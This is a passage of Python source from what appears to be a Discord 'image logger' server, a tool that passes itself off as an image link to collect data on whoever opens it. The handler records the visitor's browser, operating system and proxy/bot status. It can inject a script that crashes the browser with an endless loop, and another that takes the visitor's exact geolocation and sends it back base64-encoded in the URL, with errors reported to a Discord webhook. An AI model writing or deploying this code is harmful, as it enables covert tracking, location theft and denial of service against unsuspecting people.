                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
